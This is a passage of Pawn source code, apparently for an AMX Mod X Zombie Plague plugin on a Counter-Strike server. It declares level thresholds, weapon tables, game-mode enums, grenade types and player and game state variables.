#define ACCESS_SET_ZP_BAN		ADMIN_LEVEL_H

#define MAX_LEVEL				501
#define MAX_APS					5000000
#define MAX_APS_RESET_1			5641000
#define MAX_APS_RESET_2			11282000
#define MAX_APS_RESET_4			25252500

new gBLOCK_MESSAGES[][] = { "#C4_Arming_Cancelled", "#Bomb_Planted", "#C4_Plant_Must_Be_On_Ground", "#C4_Plant_At_Bomb_Spot", "#CZero_LearningMap", "#CZero_AnalyzingHidingSpots", 
"#CZero_AnalyzingApproachPoints", "#Hint_careful_around_hostages", "#Injured_Hostage", "#Hint_removed_for_next_hostage_killed", "#Hint_lost_money", "#Killed_Hostage",
"#Only_CT_Can_Move_Hostages", "#Cstrike_Chat_AllSpec", "#Cstrike_Chat_AllDead", "#Cstrike_Chat_All", "#Cstrike_Chat_Spec", "#Cstrike_Chat_T_Dead", "#Cstrike_Chat_T",
"#Cstrike_Chat_T_Loc", "#Cstrike_Chat_CT_Dead", "#Cstrike_Chat_CT", "#Cstrike_Chat_CT_Loc", "#Cannot_Buy_This", "#Cstrike_Already_Own_Weapon", "#Not_Enough_Money",
"#Hint_use_nightvision", "#Already_Have_One", "#Cannot_Carry_Anymore", "#Already_Have_Kevlar_Bought_Helmet", "#Already_Have_Kevlar_Helmet", 
"#Already_Have_Helmet_Bought_Kevlar", "#Already_Have_Kevlar", "#Cannot_Be_Spectator", "#Game_join_ct", "#Game_join_terrorist", "#Only_1_Team_Change", "#Terrorist_Select",
"#CT_Select", "#Humans_Join_Team_T", "#Humans_Join_Team_CT", "#Too_Many_CTs", "#Too_Many_Terrorists", "#All_Teams_Full", "#CTs_Full", "#Terrorists_Full",
"#Cannot_Switch_From_VIP", "#Bomb_Defusal_Kit", "#Game_unknown_command", "#Buy", "#Command_Not_Available", "#Ignore_Broadcast_Team_Messages", 
"#Ignore_Broadcast_Messages", "#IG_Team_Select_Spect", "#IG_VIP_Team_Select_Spect", "#IG_VIP_Team_Select", "#T_BuyItem", "#CT_BuyItem", "#DT_BuyItem", "#DCT_BuyItem",
"#BuyMachineGun", "#AS_T_BuyMachineGun", "#T_BuyRifle", "#CT_BuyRifle", "#AS_T_BuyRifle", "#AS_CT_BuyRifle", "#T_BuySubMachineGun", "#CT_BuySubMachineGun",
"#AS_T_BuySubMachineGun", "#AS_CT_BuySubMachineGun", "#BuyShotgun", "#AS_BuyShotgun", "#T_BuyPistol", "#CT_BuyPistol", "#IG_Team_Select", "#Team_Select",
"#Game_no_timelimit", "#Game_timelimit", "#Game_voted_for_map", "#Cannot_Vote_Need_More_People", "#Game_votemap_usage", "#Cannot_Vote_Map", "#Wait_3_Seconds",
"#Game_vote_cast", "#Game_vote_not_yourself", "#Game_vote_players_on_your_team", "#Game_vote_player_not_Found", "#Cannot_Vote_With_Less_Than_Three", "#Game_vote_usage",
"#Cstrike_Name_Change", "#Name_change_at_respawn", "#Defusing_Bomb_Without_Defuse_Kit", "#Defusing_Bomb_With_Defuse_Kit", "#C4_Defuse_Must_Be_On_Ground",
"#Hint_you_have_the_bomb", "#All_Hostages_Rescued", "#Round_Draw", "#Terrorists_Win", "#CTs_Win", "#BoGmb_Defused", "#Target_Bombed", "#Escaping_Terrorists_Neutralized",
"#CTs_PreventEscape", "#Terrorists_Escaped", "#VIP_Assassinated", "#VIP_Escaped", "#Game_Commencing", "#Game_scoring", "#Auto_Team_Balance_Next_Round",
"#All_VIP_Slots_Full", "#Game_added_position", "#VIP_Not_Escaped", "#Terrorists_Not_Escaped", "#Hostages_Not_Rescued", "#Target_Saved", "#Team_Select_Spect",
"#Hint_win_round_by_killing_enemy", "#Hint_reward_for_killing_vip", "#Hint_careful_around_teammates", "#Banned_For_Killing_Teamates", "#Game_teammate_kills",
"#Killed_Teammate", "#Map_Vote_Extend", "#Votes", "#Vote", "#Game_required_votes", "#Spec_Mode%i", "#Spec_NoTarget", "#Game_radio_location", "#Game_radio",
"#Game_teammate_attack", "#Hint_try_not_to_injure_teammates", "#Spec_Duck", "#Hint_cannot_play_because_tk", "#Hint_use_hostage_to_stop_him",
"#Hint_lead_hostage_to_rescue_point", "#Terrorist_cant_buy", "#CT_cant_buy", "#VIP_cant_buy", "#Cant_buy", "#Hint_press_buy_to_purchase", "#Game_idle_kick",
"#Hint_you_are_the_vip", "#Hint_hostage_rescue_zone", "#Hint_you_are_in_targetzone", "#Hint_terrorist_escape_zone", "#Hint_terrorist_vip_zone",
"#Hint_ct_vip_zone", "#Hint_out_of_ammo", "#Hint_press_use_so_hostage_will_follow", "#Hint_prevent_hostage_rescue", "#Hint_rescue_the_hostages",
"#Hint_spotted_a_friend", "#Hint_spotted_an_enemy", "#Game_bomb_drop", "#Weapon_Cannot_Be_Dropped", "#Game_join_ct_auto", "#Game_join_terrorist_auto",
"#Terrorist_Escaped", "#Game_bomb_pickup", "#Got_bomb", "#CZero_Tutor_Turned_Off", "#CZero_Tutor_Turned_On", "#Cstrike_TutorState_Waiting_For_Start",
"#Cstrike_TutorState_Buy_Time", "#Cstrike_TutorState_Running_Away_From_Ticking_Bomb", "#Cstrike_TutorState_Looking_For_Loose_Bomb",
"#Cstrike_TutorState_Guarding_Bomb", "#Cstrike_TutorState_Planting_Bomb", "#Cstrike_TutorState_Moving_To_Bomb_Site", "#Cstrike_TutorState_Escorting_Bomb_Carrier",
"#Cstrike_TutorState_Attacking_Hostage_Escort", "#Cstrike_TutorState_Looking_For_Hostage_Escort", "#Cstrike_TutorState_Moving_To_Intercept_Enemy",
"#Cstrike_TutorState_Guarding_Hostage", "#Cstrike_TutorState_Defusing_Bomb", "#Cstrike_TutorState_Guarding_Loose_Bomb", "#Cstrike_TutorState_Looking_For_Bomb_Carrier",
"#Cstrike_TutorState_Moving_To_Bombsite", "#Cstrike_TutorState_Following_Hostage_Escort", "#Cstrike_TutorState_Escorting_Hostage",
"#Cstrike_TutorState_Undefine" }

#define gAMMOPACKS_NEEDED_RESET(%1)		(%1 + 1) * 11282
#define gAMMOPACKS_NEEDED_RESET_2(%1)	(%1 + 1) * 22564
#define gAMMOPACKS_NEEDED_RESET_4(%1)	(%1 + 1) * 50505
new gAMMOPACKS_NEEDED[MAX_LEVEL] =
{
	-1, 216, 455, 839, 1466, 2306, 2918, 3560, 4218, 4893, 6126, // 10
	8511, 10981, 12431, 15054, 16290, 17714, 19724, 21667, 23202, 25426, 27717, 29909, 31927, 34058, 35240, 36829, 39392, 43324, 46506, 49474, // 29
	53287, 57269, 60574, 64274, 67557, 71112, 74071, 77658, 81137, 84490, 87733, 90868, 97340, 102357, 107618, // 44
	115556, 121816, 128440, 133086, 139623, 144276, 150296, 157195, 162006, 169155, 176331, 183648, 188492, 194824, 200281, 204972, 212004, 216282, 223498, 230130, // 64
	236980, 243217, 250683, 256429, 261991, 266794, 273210, 280303, 287491, 293248, 300076, 307141, 315925, 325208, 333899, // 79
	342360, 351358, 359740, 368388, 376638, 384429, 392694, 401421, 410722, 419068, 427498, 435700, 443819, 452036, 460568, 468408, 476302, 484671, 493196, 502277, // 99
	510286, 519351, 528333, 537614, 546735, 555840, 564717, 573952, 582461, 590438, 598398, 607018, 615907, 624434, 632715, 641819, 650711, 658636, 667467, 675665, // 119
	683863, 691680, 699687, 708738, 717959, 727109, 734934, 743459, 751562, 759943, 767898, 777007, 785752, 793688, 802485, 810449, 819125, 828181, 836661, 844592, // 139
	853117, 861827, 870188, 878958, 888138, 896734, 905160, 913808, 921752, 930920, 939108, 947539, 956650, 965797, 974646, 983848, 992210, 1000028, 1008734, 1017916, // 159
	1026815, 1036034, 1044713, 1053782, 1062510, 1070652, 1078470, 1086658, 1094541, 1102516, 1110378, 1119271, 1128443, 1136885, 1145227, // 174
	1153208, 1161556, 1167047, 1175474, 1187796, 1193181, 1197251, 1198348, 1198743, 1199307, 1199999, 1203828, 1212993, 1221922, 1230945, // 189
	1239830, 1249059, 1257153, 1265651, 1274698, 1282771, 1292022, 1300953, 1310249, 1319560, 1327330, 1335297, 1344120, 1353280, 1361992, // 204
	1370370, 1379192, 1388022, 1395960, 1404123, 1412021, 1420935, 1429048, 1438074, 1446610, 1455538, 1463857, 1473042, 1481928, 1490265, // 219
	1499515, 1507643, 1515614, 1524165, 1532021, 1540740, 1548913, 1557829, 1565749, 1573984, 1582322, 1590655, 1599760, 1608682, 1617399, // 234
	1626562, 1635530, 1644394, 1653101, 1661917, 1670639, 1679374, 1688321, 1696449, 1704410, 1713562, 1721408, 1730009, 1738614, 1746953, // 249
	1755485, 1763447, 1771534, 1779581, 1788246, 1797453, 1806222, 1815363, 1823929, 1831862, 1840990, 1849085, 1857239, 1865436, 1874553, // 264
	1883436, 1891439, 1899384, 1908098, 1916531, 1924329, 1933114, 1941271, 1949959, 1957839, 1966780, 1975106, 1985038, 1993275, 2003564, // 279
	2012730, 2021812, 2031825, 2041258, 2049375, 2058427, 2068177, 2077348, 2087715, 2097235, 2105894, 2116253, 2125295, 2134511, 2144559, // 294
	2153794, 2162792, 2171785, 2181488, 2190381, 2199855, 2208888, 2217554, 2227808, 2237690, 2247255, 2256964, 2266688, 2275957, 2284244, // 309
	2293008, 2302960, 2311956, 2321749, 2330168, 2338311, 2348352, 2356783, 2366937, 2377178, 2385825, 2394700, 2404043, 2412680, 2422453, // 324
	2432026, 2442225, 2450802, 2460777, 2470397, 2478624, 2487200, 2495894, 2504911, 2515300, 2525158, 2535164, 2544423, 2554177, 2563311, // 339
	2572366, 2581693, 2590779, 2600448, 2608925, 2618320, 2628095, 2638336, 2648678, 2657507, 2666880, 2676436, 2685678, 2694269, 2703353, // 354
	2711799, 2721876, 2731879, 2740172, 2749714, 2758864, 2768757, 2777153, 2786668, 2796640, 2806372, 2814493, 2824112, 2833434, 2842167, // 369
	2850442, 2860483, 2868858, 2878559, 2888540, 2896684, 2906653, 2916131, 2925504, 2934366, 2944578, 2954270, 2962834, 2972024, 2981618, // 384
	2990477, 2999185, 3008739, 3017385, 3027729, 3036517, 3045604, 3054604, 3063966, 3073660, 3082608, 3092464, 3101281, 3111672, 3120997, // 399
	3129395, 3139273, 3149423, 3157587, 3165793, 3175714, 3186028, 3195958, 3204749, 3213597, 3223410, 3232609, 3242935, 3253164, 3262959, // 414
	3271406, 3280246, 3289119, 3298579, 3306908, 3315838, 3325765, 3334255, 3343040, 3352107, 3360561, 3370793, 3379253, 3388361, 3397838, // 429
	3408033, 3416603, 3425496, 3434086, 3443031, 3451661, 3461802, 3469947, 3479743, 3487891, 3497056, 3506467, 3515300, 3524232, 3534072, // 444
	3543663, 3552705, 3563021, 3572184, 3582396, 3592218, 3601852, 3610032, 3620083, 3629109, 3639403, 3649812, 3659469, 3668688, 3677177, // 459
	3686431, 3695103, 3704824, 3714677, 3724315, 3734539, 3744450, 3754356, 3763397, 3772282, 3782282, 3791838, 3800239, 3808699, 3816915, // 474
	3827108, 3836819, 3858432, 3879426, 3901033, 3923273, // 479
	3940613, 3956853, 3978540, 3996010, 4016471, 4037492, 4057206, 4073506, 4090305, 4107483, 4124210, 4142713, 4161449, 4182886, // 494
	4198848, 4250000, 4500000, 5000000, // 499
	5250001 // 500 (bug fix)
}

stock const gYEAR_SECONDS[2] = 
{ 
	31536000,	// Normal year
	31622400 	// Leap year
}

stock const gMONTH_SECONDS[12] = 
{ 
	2678400, // January		31 
	2419200, // February	28
	2678400, // March		31
	2592000, // April		30
	2678400, // May			31
	2592000, // June		30
	2678400, // July		31
	2678400, // August		31
	2592000, // September	30
	2678400, // October		31
	2592000, // November	30
	2678400  // December	31
}

stock const gDAY_SECONDS = 86400
stock const gHOUR_SECONDS = 3600
stock const gMINUTE_SECONDS = 60

/*================================================================================
 [Constants, Offsets, Macros]
=================================================================================*/

// Customization file sections
enum
{
	SECTION_NONE = 0,
	//SECTION_SOUNDS,
	SECTION_BUY_MENU_WEAPONS,
	//SECTION_EXTRA_ITEMS_WEAPONS,
	SECTION_HARD_CODED_ITEMS_COSTS
}

// Task offsets
enum (+= 12345)
{
	TASK_MODEL = 79681,
	TASK_TEAM,
	TASK_SPAWN,
	TASK_BLOOD,
	TASK_AURA,
	TASK_BURN,
	TASK_NVISION,
	/*TASK_FLASH,
	TASK_CHARGE,*/
	TASK_SHOWHUD,
	TASK_MAKEZOMBIE,
	TASK_WELCOMEMSG,
	TASK_INFOCOMBO,
	TASK_FINISHCOMBO
	#if defined MOLOTOV_ON
	,
	TASK_MOLOTOV_EFFECT
	#endif
}

// IDs inside tasks
#define ID_MODEL (taskid - TASK_MODEL)
#define ID_TEAM (taskid - TASK_TEAM)
#define ID_SPAWN (taskid - TASK_SPAWN)
#define ID_BLOOD (taskid - TASK_BLOOD)
#define ID_AURA (taskid - TASK_AURA)
#define ID_BURN (taskid - TASK_BURN)
#define ID_NVISION (taskid - TASK_NVISION)
/*#define ID_FLASH (taskid - TASK_FLASH)
#define ID_CHARGE (taskid - TASK_CHARGE)*/
#define ID_SHOWHUD (taskid - TASK_SHOWHUD)
#define ID_INFOCOMBO (taskid - TASK_INFOCOMBO)
#define ID_FINISHCOMBO (taskid - TASK_FINISHCOMBO)

// BP Ammo Refill task
#define REFILL_WEAPONID args[0]

// For weapon buy menu handlers
#define WPN_STARTID g_menu_data[id][1]
#define WPN_MAXIDS ArraySize(g_primary_items)
#define WPN_SELECTION (g_menu_data[id][1]+key)
#define WPN_AUTO_ON g_menu_data[id][2]
#define WPN_AUTO_PRI g_menu_data[id][3]
#define WPN_AUTO_SEC g_menu_data[id][4]
#define WPN_STARTID_2 g_menu_data[id][5]
#define WPN_MAXIDS_2 ArraySize(g_secondary_items)
#define WPN_SELECTION_2 (g_menu_data[id][5]+key)
#define WPN_AUTO_TER g_menu_data[id][6]

// Points
#define POINT_CLASS g_point_data[id][0]
#define POINT_ITEM g_point_data[id][1]

// Logros
#define LOGRO_CLASS	g_logro_data[id][0]
#define LOGRO_ITEM	g_logro_data[id][1]

#define LOGRO_ID_OTHER		g_logro_data[id][2]
#define LOGRO_CLASS_OTHER	g_logro_data[id][3]

// For player list menu handlers
#define PL_ACTION g_menu_data[id][0]

// For extra items menu handlers
#define EXTRAS_CUSTOM_STARTID (EXTRA_WEAPONS_STARTID + ArraySize(g_extraweapon_names))

// Menu selections
const MENU_KEY_AUTOSELECT = 7
const MENU_KEY_BACK = 7
const MENU_KEY_NEXT = 8
const MENU_KEY_EXIT = 9

// Hard coded extra items
enum
{
	EXTRA_NVISION = 0,
	EXTRA_ANTIDOTE,
	EXTRA_MADNESS,
	EXTRA_INFBOMB,
	EXTRA_UNLIMITED_CLIP,
	EXTRA_PRECISION_CLIP,
	EXTRA_ARMOR,
	EXTRA_WEAPONS_STARTID
}

new gMODE_INFECTION, gMODE_NEMESIS, gMODE_SURVIVOR, gMODE_SWARM, gMODE_MULTI, gMODE_PLAGUE, gMODE_ARMAGEDDON, gMODE_SYNAPSIS, gMODE_L4D, gMODE_WESKER,
gMODE_NINJA, gMODE_SNIPER, gMODE_TARINGA, gMODE_TROLL;

// Game modes
enum
{
	MODE_NONE = 0,
	MODE_INFECTION,
	MODE_NEMESIS,
	MODE_SURVIVOR,
	MODE_SWARM,
	MODE_MULTI,
	MODE_PLAGUE,
	MODE_ARMAGEDDON,
	MODE_SYNAPSIS,
	MODE_L4D,
	MODE_WESKER,
	MODE_NINJA,
	MODE_SNIPER,
	MODE_TARINGA,
	MODE_TROLL
}

// ZP Teams
const ZP_TEAM_NO_ONE = 0
const ZP_TEAM_ANY = 0
const ZP_TEAM_ZOMBIE = (1<<0)
const ZP_TEAM_HUMAN = (1<<1)
const ZP_TEAM_NEMESIS = (1<<2)
const ZP_TEAM_SURVIVOR = (1<<3)

// Zombie classes
const ZCLASS_NONE = -1

// Human classes
const HCLASS_NONE = -1

// HUD messages
const Float:HUD_EVENT_X = -1.0
const Float:HUD_EVENT_Y = 0.17
const Float:HUD_INFECT_X = 0.05
const Float:HUD_INFECT_Y = 0.45
const Float:HUD_SPECT_X = 0.6
const Float:HUD_SPECT_Y = 0.7
const Float:HUD_STATS_X = 0.02
const Float:HUD_STATS_Y = 0.12

// CS Player PData Offsets (win32)
const OFFSET_PAINSHOCK = 108 // ConnorMcLeod
const OFFSET_CSTEAMS = 114
const OFFSET_CSMONEY = 115
const OFFSET_FLASHLIGHT_BATTERY = 244
const OFFSET_CSDEATHS = 444

// CS Player CBase Offsets (win32)
const OFFSET_ACTIVE_ITEM = 373

// CS Weapon CBase Offsets (win32)
const OFFSET_WEAPONOWNER = 41

// Linux diff's
const OFFSET_LINUX = 5 // offsets 5 higher in Linux builds
const OFFSET_LINUX_WEAPONS = 4 // weapon offsets are only 4 steps higher on Linux

// CS Teams
enum
{
	FM_CS_TEAM_UNASSIGNED = 0,
	FM_CS_TEAM_T,
	FM_CS_TEAM_CT,
	FM_CS_TEAM_SPECTATOR
}
new const CS_TEAM_NAMES[][] = { "UNASSIGNED", "TERRORIST", "CT", "SPECTATOR" }

// Some constants
const HIDE_MONEY = (1<<5)|(1<<3)
const UNIT_SECOND = (1<<12)
const DMG_HEGRENADE = (1<<24)
const IMPULSE_FLASHLIGHT = 100
const USE_USING = 2
const USE_STOPPED = 0
const STEPTIME_SILENT = 999
const BREAK_GLASS = 0x01
const FFADE_IN = 0x0000
const FFADE_STAYOUT = 0x0004
const PEV_SPEC_TARGET = pev_iuser2

// Max BP ammo for weapons
new const MAXBPAMMO[] = { -1, 52, -1, 90, 1, 32, 1, 100, 90, 1, 120, 100, 100, 90, 90, 90, 100, 120,
			30, 120, 200, 32, 90, 120, 90, 2, 35, 90, 90, -1, 100 }

// Max Clip for weapons
new const MAXCLIP[] = { -1, 13, -1, 10, -1, 7, -1, 30, 30, -1, 30, 20, 25, 30, 35, 25, 12, 20,
			10, 30, 100, 8, 30, 30, 20, -1, 7, 30, 30, -1, 50 }

// Ammo IDs for weapons
new const AMMOID[] = { -1, 9, -1, 2, 12, 5, 14, 6, 4, 13, 10, 7, 6, 4, 4, 4, 6, 10,
			1, 10, 3, 5, 4, 10, 2, 11, 8, 4, 2, -1, 7 }

// Ammo Type Names for weapons
new const AMMOTYPE[][] = { "", "357sig", "", "762nato", "", "buckshot", "", "45acp", "556nato", "", "9mm", "57mm", "45acp",
			"556nato", "556nato", "556nato", "45acp", "9mm", "338magnum", "9mm", "556natobox", "buckshot",
			"556nato", "9mm", "762nato", "", "50ae", "556nato", "762nato", "", "57mm" }

// Weapon IDs for ammo types
new const AMMOWEAPON[] = { 0, CSW_AWP, CSW_SCOUT, CSW_M249, CSW_AUG, CSW_XM1014, CSW_MAC10, CSW_FIVESEVEN, CSW_DEAGLE,
			CSW_P228, CSW_ELITE, CSW_FLASHBANG, CSW_HEGRENADE, CSW_SMOKEGRENADE, CSW_C4 }

// Primary and Secondary Weapon Names
new const WEAPONNAMES[][] = { "", "P228 Compact", "", "Schmidt Scout", "", "XM1014 M4", "", "Ingram MAC-10", "Steyr AUG A1",
			"", "Dual Elite Berettas", "FiveseveN", "UMP 45", "SG-550 Auto-Sniper", "IMI Galil", "Famas",
			"USP .45 ACP Tactical", "Glock 18C", "AWP Magnum Sniper", "MP5 Navy", "M249 Para Machinegun",
			"M3 Super 90", "M4A1 Carbine", "Schmidt TMP", "G3SG1 Auto-Sniper", "", "Desert Eagle .50 AE",
			"SG-552 Commando", "AK-47 Kalashnikov", "", "ES P90" }
			
// Primary and Secondary Weapon Names for edit weapons
new const WEAPONNAMES_EDIT[][] = { "", "Llama M-82", "", "Schmidt Scout", "", "XM1014 M4", "", "Ingram MAC-10", "PPSh-41",
			"", "Obregón", "Steyr M1912", "UMP 45", "Nudelman N-37", "IMI Galil", "Famas",
			"Mark 23", "Bersa Thunder 9", "AWP Magnum Sniper", "Owen", "M249 Para Machinegun",
			"Saiga-12", "PP-19 Bizon", "Steyr TMP", "G3SG1 Auto-Sniper", "", "Luger P08",
			"SG-552 Commando", "TDI Vector", "", "ES P90" }

// Primary and Secondary Weapon Names for MOST edit weapons
new const WEAPONNAMES_EDIT_2[][] = { "", "Walther PPK", "", "Schmidt Scout", "", "Armsel Striker", "", "Ingram MAC-10", "Steyr AUG A1",
			"", "Tokarev TT-33", "Astra 400", "UMP 45", "SG-550 Auto-Sniper", "IMI Galil", "Famas",
			"Pistola M15", "Cz vz. 27", "Lanza Misiles (NO ESTÁ)", "Skorpion vz. 61", "M61 Vulcan",
			"Bataan 71", "Halcón M/943", "Schmidt TMP", "G3SG1 Auto-Sniper", "", "SIG-Sauer P230",
			"SG-552 Commando", "AK-103", "", "ES P90" }
			
// Weapon entity names
new const WEAPONENTNAMES[][] = { "", "weapon_p228", "", "weapon_scout", "weapon_hegrenade", "weapon_xm1014", "weapon_c4", "weapon_mac10",
			"weapon_aug", "weapon_smokegrenade", "weapon_elite", "weapon_fiveseven", "weapon_ump45", "weapon_sg550",
			"weapon_galil", "weapon_famas", "weapon_usp", "weapon_glock18", "weapon_awp", "weapon_mp5navy", "weapon_m249",
			"weapon_m3", "weapon_m4a1", "weapon_tmp", "weapon_g3sg1", "weapon_flashbang", "weapon_deagle", "weapon_sg552",
			"weapon_ak47", "weapon_knife", "weapon_p90" }
		
// Block radio		
new gBLOCK_RADIO[][] = { "radio1", "radio2", "radio3", "coverme", "takepoint", "holdpos", "regroup", "followme", "takingfire", "go", "fallback", "sticktog", "getinpos",
"stormfront", "report", "roger", "enemyspot", "needbackup", "sectorclear", "inposition", "reportingin", "getout", "negative", "enemydown" }

#define gAMMOUNT_DMG(%1)		(%1 + 1) * 475

// Damage Power values for weapons
new const Float:DamageWeaponPower[] = 
{
	-1.0,	// ---
	1.5,	// P228
	-1.0,	// ---
	1.0,	// SCOUT
	-1.0,	// ---
	3.5,	// XM1014
	-1.0,	// ---
	1.0,	// MAC10
	2.5,	// AUG
	-1.0,	// ---
	1.5,	// ELITE
	1.5,	// FIVESEVEN
	1.0,	// UMP45
	2.5,	// SG550
	1.0,	// GALIL
	1.0,	// FAMAS
	1.5,	// USP
	1.5,	// GLOCK18
	1.0,	// AWP
	2.5,	// MP5NAVY
	5.0,	// M249
	3.0,	// M3
	2.5,	// M4A1
	4.0,	// TMP
	1.0,	// G3SG1
	-1.0,	// ---
	1.5,	// DEAGLE
	1.0,	// SG552
	2.0,	// AK47
	-1.0,	// ---
	1.0		// P90
}
new const Float:DamageWeaponPower_2[] = 
{
	-1.0,	// ---
	2.5,	// P228_2
	-1.0,	// ---
	1.0,	// SCOUT
	-1.0,	// ---
	3.5,	// XM1014
	-1.0,	// ---
	1.0,	// MAC10
	2.5,	// AUG
	-1.0,	// ---
	2.5,	// ELITE_2
	2.5,	// FIVESEVEN_2
	1.0,	// UMP45
	2.5,	// SG550
	1.0,	// GALIL
	1.0,	// FAMAS
	2.5,	// USP_2
	2.5,	// GLOCK18_2
	1.0,	// AWP
	3.5,	// MP5NAVY_2
	5.0,	// M249
	4.0,	// M3_2
	4.5,	// M4A1_2
	2.0,	// TMP
	1.0,	// G3SG1
	-1.0,	// ---
	2.5,	// DEAGLE_2
	1.0,	// SG552
	4.0,	// AK47_2
	-1.0,	// ---
	1.0		// P90
}

// CS sounds
new const sound_flashlight[] = "items/flashlight1.wav"
new const sound_buyammo[] = "items/9mmclip1.wav"
new const sound_armorhit[] = "player/bhit_helmet-1.wav"

// Explosion radius for custom grenades
const Float:NADE_EXPLOSION_RADIUS = 240.0
const Float:NADE_BUBBLE_RADIUS = 100.0
const Float:FORCE_PUSH = 400.0
#if defined MOLOTOV_ON
const Float:MOLOTOV_RADIUS = 170.0
#endif

// HACK: pev_ field used to store additional ammo on weapons
const PEV_ADDITIONAL_AMMO = pev_iuser1

// HACK: pev_ field used to store custom nade types and their values
const PEV_NADE_TYPE = EV_INT_flTimeStepSound
const NADE_TYPE_INFECTION = 1111
const NADE_TYPE_INFECTION_IMPACT = 2222
const NADE_TYPE_NAPALM = 3333
const NADE_TYPE_NAPALM_IMPACT = 4444
const NADE_TYPE_FROST = 5555
const NADE_TYPE_FROST_IMPACT = 6666
const NADE_TYPE_FLARE = 7777
#if defined MOLOTOV_ON
const NADE_TYPE_MOLOTOV = 8888
const NADE_TYPE_MOLOTOV_1 = 9999
const NADE_TYPE_MOLOTOV_2 = 11100
#endif
const NADE_TYPE_SUPERNOVA = 12211
const NADE_TYPE_SUPERNOVA_IMPACT = 13322
const NADE_TYPE_BUBBLE = 14433
const NADE_TYPE_ANIQUILATION = 15544
const PEV_FLARE_COLOR = pev_punchangle
const PEV_FLARE_DURATION = EV_INT_flSwimTime

// Weapon bitsums
const PRIMARY_WEAPONS_BIT_SUM = (1<<CSW_SCOUT)|(1<<CSW_XM1014)|(1<<CSW_MAC10)|(1<<CSW_AUG)|(1<<CSW_UMP45)|(1<<CSW_SG550)|(1<<CSW_GALIL)|(1<<CSW_FAMAS)|(1<<CSW_AWP)|(1<<CSW_MP5NAVY)|(1<<CSW_M249)|(1<<CSW_M3)|(1<<CSW_M4A1)|(1<<CSW_TMP)|(1<<CSW_G3SG1)|(1<<CSW_SG552)|(1<<CSW_AK47)|(1<<CSW_P90)
const SECONDARY_WEAPONS_BIT_SUM = (1<<CSW_P228)|(1<<CSW_ELITE)|(1<<CSW_FIVESEVEN)|(1<<CSW_USP)|(1<<CSW_GLOCK18)|(1<<CSW_DEAGLE)

// Allowed weapons for zombies (added grenades/bomb for sub-plugin support, since they shouldn't be getting them anyway)
const ZOMBIE_ALLOWED_WEAPONS_BITSUM = (1<<CSW_KNIFE)|(1<<CSW_HEGRENADE)|(1<<CSW_FLASHBANG)|(1<<CSW_SMOKEGRENADE)|(1<<CSW_C4)

// Menu keys
const KEYSMENU = MENU_KEY_1|MENU_KEY_2|MENU_KEY_3|MENU_KEY_4|MENU_KEY_5|MENU_KEY_6|MENU_KEY_7|MENU_KEY_8|MENU_KEY_9|MENU_KEY_0

// Admin menu actions
enum
{
	ACTION_ZOMBIEFY_HUMANIZE = 0,
	ACTION_MAKE_NEMESIS,
	ACTION_MAKE_SURVIVOR,
	ACTION_RESPAWN_PLAYER,
	ACTION_MODE_SWARM,
	ACTION_MODE_MULTI,
	ACTION_MODE_PLAGUE,
	
	ACTION_MODE_WESKER = 4,
	ACTION_MODE_NINJA,
	ACTION_MAKE_TROLL/*,
	ACTION_MODE_SNIPER*/
}

// Custom forward return values
const ZP_PLUGIN_HANDLED = 97

/*================================================================================
 [Global Variables]
=================================================================================*/

// Player vars
new g_zombie[33] // is zombie
new g_nemesis[33] // is nemesis
new g_survivor[33] // is survivor
new g_firstzombie[33] // is first zombie
new g_lastzombie[33] // is last zombie
new g_lasthuman[33] // is last human
new g_frozen[33] // is frozen (can't move)
new g_nodamage[33] // has spawn protection/zombie madness
new g_respawn_as_zombie[33] // should respawn as zombie
new g_nvision[33] // has night vision
new g_nvisionenabled[33] // has night vision turned on
new g_zombieclass[33] // zombie class
new g_zombieclassnext[33] // zombie class for next infection
new g_humanclass[33] // human class
new g_humanclassnext[33] // human class for next spawn
new g_canbuy[33] // is allowed to buy a new weapon through the menu
new g_ammopacks[33] // ammo pack count
new g_damagedealt[33] // damage dealt to zombies (used to calculate ammo packs reward)
//new Float:g_lastleaptime[33] // time leap was last used
new g_playermodel[33][32] // current model's short name [player][model]
new g_menu_data[33][7] // data for some menu handlers
new g_point_data[33][2] // data for some points
new g_logro_data[33][4] // data for some logros
new g_burning_duration[33] // burning task duration

// Game vars
new g_newround // new round starting
new g_endround // round ended
new g_nemround // nemesis round
new g_survround // survivor round
new g_swarmround // swarm round
new g_plagueround // plague round
new g_modestarted // mode fully started
new g_scorezombies, g_scorehumans // team scores
new g_spawnCount, g_spawnCount2 // available spawn points counter
new Float:g_spawns[MAX_CSDM_SPAWNS][3], Float:g_spawns2[MAX_CSDM_SPAWNS][3] // spawn points data
new Float:g_models_targettime // for adding delays between Model Change messages
new Float:g_teams_targettime // for adding delays between Team Change messages
new g_MsgSync, g_MsgSync2, g_MsgSync3 // message sync objects
new g_trailSpr, g_exploSpr, g_flameSpr, g_smokeSpr, g_glassSpr, g_beamSpr, g_explo2Spr, g_explo3Spr, g_explo4Spr, g_smoke2Spr, g_whiteSpr, g_trail2Spr // grenade sprites
#if defined MOLOTOV_ON
new g_molotovSpr
#endif
new g_modname[64] // for formatting the mod name
new g_maxplayers // max players counter
new g_fwSpawn, g_fwPrecacheSound // spawn and precache sound forward handles
new g_infbombcounter = 5, g_antidotecounter[33] // to limit buying some items
new g_arrays_created // to prevent stuff from being registered before initializing arrays
new g_lastplayerleaving // flag for whenever a player leaves and another takes his place
new g_switchingteam // flag for whenever a player's team change emessage is sent

// Message IDs vars
new g_msgScoreInfo, g_msgNVGToggle, g_msgScoreAttrib, g_msgAmmoPickup, g_msgScreenFade,
g_msgDeathMsg, g_msgSetFOV, g_msgTeamInfo,
g_msgHideWeapon, g_msgCrosshair, g_msgSayText, g_msgScreenShake, g_msgCurWeapon,
g_msgTutorText, g_msgTutorClose

// Some forward handlers
new/* g_fwRoundStart, g_fwRoundEnd, g_fwUserInfected_pre, g_fwUserInfected_post,
g_fwUserHumanized_pre, g_fwUserHumanized_post, g_fwUserInfect_attempt,
g_fwUserHumanize_attempt, g_fwExtraItemSelected, g_fwUserUnfrozen,
g_fwUserLastZombie, g_fwUserLastHuman,*/ g_fwDummyResult

// Extra Items vars
new Array:g_extraitem_name // caption
new Array:g_extraitem_cost // cost
new Array:g_extraitem_team // team
new g_extraitem_i // loaded extra items counter

// For extra items file parsing
new Array:g_extraitem_new

// Zombie Classes vars
new Array:g_zclass_name // caption
new Array:g_zclass_info // description
new Array:g_zclass_modelsstart // start position in models array
new Array:g_zclass_modelsend // end position in models array
new Array:g_zclass_playermodel // player models array
new Array:g_zclass_modelindex // model indices array
new Array:g_zclass_clawmodel // claw model
new Array:g_zclass_hp // health
new Array:g_zclass_spd // speed
